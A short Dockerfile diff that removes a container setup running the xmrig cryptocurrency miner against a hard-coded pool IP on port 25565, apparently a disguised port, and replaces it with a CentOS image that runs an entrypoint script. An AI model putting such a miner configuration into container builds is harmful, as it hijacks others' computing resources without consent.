@@ -1,7 +1,9 @@
-FROM alpine:3.13.3
+FROM centos
 
-COPY xmrig /usr/local/bin/xmrig
+WORKDIR /opt
 
-ENTRYPOINT ["xmrig"]
+COPY . .
 
-CMD ["-o", "113.31.119.144:25565", "-k", "--randomx-1gb-pages"]
+RUN chmod +x docker-entrypoint.sh
+
+ENTRYPOINT ["./docker-entrypoint.sh"]
